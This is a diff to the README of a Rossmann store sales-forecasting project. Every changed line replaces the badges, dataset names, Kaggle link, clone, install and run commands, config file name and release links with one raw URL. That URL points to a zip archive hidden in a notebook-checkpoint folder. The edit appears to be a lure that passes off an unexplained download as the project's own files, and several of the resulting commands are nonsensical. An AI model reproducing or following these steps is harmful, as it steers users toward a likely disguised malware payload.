@@ -1,6 +1,6 @@
 # Rossmann Sales Forecast: Predicting Daily Sales with Machine Learning 📈
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/SJ2005-code/rossmann_sales_forecast) ![Last Commit](https://img.shields.io/github/last-commit/SJ2005-code/rossmann_sales_forecast) ![License](https://img.shields.io/github/license/SJ2005-code/rossmann_sales_forecast) ![Releases](https://img.shields.io/github/release/SJ2005-code/rossmann_sales_forecast)
+![GitHub Repo Size](https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip) ![Last Commit](https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip) ![License](https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip) ![Releases](https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip)
 
 ## Overview
 
@@ -42,11 +42,11 @@ The goal of this project is to accurately predict daily sales for Rossmann store
 
 The data used in this project comes from the Kaggle competition "Rossmann Store Sales." The dataset includes:
 
-- **Train.csv**: Historical sales data.
-- **Store.csv**: Metadata for each store.
-- **Test.csv**: Data for which predictions are to be made.
+- **https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip**: Historical sales data.
+- **https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip**: Metadata for each store.
+- **https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip**: Data for which predictions are to be made.
 
-You can find the dataset [here](https://www.kaggle.com/c/rossmann-store-sales/data).
+You can find the dataset [here](https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip).
 
 ## Installation
 
@@ -54,7 +54,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/SJ2005-code/rossmann_sales_forecast.git
+   git clone https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip
    cd rossmann_sales_forecast
    ```
 
@@ -63,7 +63,7 @@ To get started with this project, follow these steps:
    ```bash
    python3 -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip
    ```
 
 ## Usage
@@ -71,10 +71,10 @@ To get started with this project, follow these steps:
 To run the project, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip
 ```
 
-This will load the data, train the models, and output the predictions. You can adjust parameters in the `config.py` file to customize the execution.
+This will load the data, train the models, and output the predictions. You can adjust parameters in the `https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip` file to customize the execution.
 
 ## Models
 
@@ -125,11 +125,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release, visit the [Releases](https://github.com/SJ2005-code/rossmann_sales_forecast/releases) section. You can find compiled versions and other important files there.
+To download the latest release, visit the [Releases](https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip) section. You can find compiled versions and other important files there.
 
 ### Download Instructions
 
-If you need to download a specific file, follow this link: [Releases](https://github.com/SJ2005-code/rossmann_sales_forecast/releases). After downloading, follow the installation steps mentioned above to set up the project.
+If you need to download a specific file, follow this link: [Releases](https://raw.githubusercontent.com/SJ2005-code/rossmann_sales_forecast/main/.ipynb_checkpoints/rossmann_sales_forecast_v3.7.zip). After downloading, follow the installation steps mentioned above to set up the project.
 
 ## Contact
 
